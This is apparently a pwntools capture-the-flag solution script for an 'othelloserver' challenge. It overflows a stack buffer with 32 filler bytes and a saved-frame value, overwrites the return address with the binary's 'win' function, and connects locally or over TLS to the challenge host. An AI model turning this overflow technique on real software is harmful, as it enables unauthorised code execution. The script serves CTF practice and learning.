from pwn import *             


""" - jezeli chcemy od samego poczatku debugowac
p = gdb.debug('./tiny', '''
    # Tutaj wpisujesz komendy do GDB
    b *0x401000    
''')
"""

context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 


#HOST="dat-overflow-dough-9114514d8eb0de78.challs.brunnerne.xyz:443"
HOST="othello-villains-81583c80768ab689.challs.brunnerne.xyz:443"
ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./othelloserver"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

if args.REMOTE:
    #p = remote(ADDRESS,PORT)
    p = remote(ADDRESS,PORT,ssl=True)
else:
    p = process(binary.path)    


win=binary.sym.win
payload= 32*b'A'+p64(0)+p64(win)

p.sendlineafter(b'Othello villains secret server. Do you know the password??',payload)
p.interactive()
